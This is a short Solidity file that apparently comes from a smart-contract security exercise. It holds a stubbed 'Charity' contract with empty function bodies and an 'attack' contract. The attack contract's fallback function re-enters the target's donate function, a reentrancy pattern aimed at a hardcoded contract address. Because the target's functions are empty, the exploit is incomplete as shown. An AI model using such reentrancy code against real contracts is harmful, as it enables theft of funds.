pragma solidity >=0.7.0 <0.9.0;
contract Charity{
  address private _owner;
    constructor() public payable{
        _owner = msg.sender;
    }
   mapping(address=>uint) public donatorBalance;
   mapping(address=>uint) public charityBalance;
   mapping(address=>bool) public donatedToContract;
   function getDonatorBalance(address donator) public view returns (uint balance) {
   }
   function getCharityBalance(address charity) public view returns (uint balance) {
   }
   function deposit() public payable {
   }
   function donate(uint amount,address charity) public payable{
   }
   function donateToContract(uint amount) public payable{      
   }
   function withdraw() public payable {
   }
   
}

contract attack{
   Charity charityContract;
   bool go;
   constructor() payable{
       charityContract =Charity(0x33B9d6C7cA171F6334F7B4FB7E5EE8E4716bD9aa);
       go = true;
   }

  fallback() external payable {
      if(go){
          charityContract.donate(1000000000000,address(this));
          go = false;
      }  
   }
   function donateToContract() public payable{
       charityContract.donateToContract(1000000000000);
   }
   function withdraw() public payable{
       charityContract.withdraw();
   }
   function deposit() public payable{
       charityContract.deposit{value: 1000000000000}();
   }
}